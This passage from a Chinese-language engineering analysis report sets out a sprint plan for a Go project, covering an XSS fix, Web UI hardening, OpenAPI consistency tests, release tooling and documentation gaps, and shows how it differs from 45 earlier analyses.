| **P2** | 文档体系完整性与知识管理 | 产品/接纳——影响用户自助能力 | 无 | 6-10 份新文档（~5000 字）+ 配置同步脚本（~50 行） | **下下 Sprint** |

### 建议的 Sprint 计划

```
Sprint N（当前 Sprint）:
  ├── 修复 Web UI XSS 漏洞（~5 行）— 安全红线，立即修复
  ├── 添加 Web UI 错误处理 + 加载态 + 空状态（~80 行）
  └── 添加 OpenAPI 路由一致性测试 + CI 验证（~50 行）

Sprint N+1:
  ├── Web UI 移动端响应式布局（~20 行 CSS）
  ├── 创建 CONTRIBUTING.md + internal/testutil 包（~200 行 + 文档）
  ├── `make dev` 开发环境目标
  └── 从代码生成配置文档（go:generate + template）

Sprint N+2:
  ├── 版本号动态注入（-ldflags）
  ├── 创建 .goreleaser.yaml + release.yml
  ├── 编写 docs/VERSIONING.md
  └── Web UI CSP 头 + 键盘导航

Sprint N+3+:
  ├── docs/ 缺失文档编写（FAQ、故障排查、安全加固、迁移指南）
  ├── docs/requirements/INDEX.md 规划索引
  ├── SDK 代码生成管道（OpenAPI → client stub）
  └── 45 份扩展分析文档的 action items 追踪
```

### 与前 45 期分析的去重关系

| 方向 | 既有覆盖 | 本分析的新贡献 |
|------|---------|-------------|
| **开发者体验 DX 入门基建** | v24: SDK DX（SDK 重试/错误映射）；v38: DX 基础设施（1 行表格）；v41: 开源社区基建（CONTRIBUTING 文件存在性） | 首次系统分析代码库级 DX：开发环境、test fixture 库、脚手架、依赖图、main.go 装配理解负担 |
| **Web UI 生产硬化** | v41: 全新管理控制台；v30: Admin Console 独立面板；v6: 文件预览缺失 | 首次系统分析**现有 282 行 SPA 的生产硬化**——错误处理、加载态、空状态、XSS、移动适配、无障碍、CSP |
| **OpenAPI 规范契约与一致性** | v11: 单行观察"无 spec vs handler 一致性验证" | 首次提供完整架构设计：路由一致性测试、请求验证中间件、响应验证、CI 集成、SDK 代码生成管道 |
| **文档体系完整性与知识管理** | ❌ **零覆盖** | 首次系统评估文档覆盖（对照 16 种文档类型），发现 10+ 缺失文档类型 + 配置文档漂移 + 扩展分析文档管理负担 |
| **发布工程与版本治理** | ⚠️ v41: 一行提及"无 semver"（无关上下文） | 首次系统分析：版本注入、goreleaser、发布流水线、artifact 签名、Docker 标签策略、配置兼容性、升级测试 |
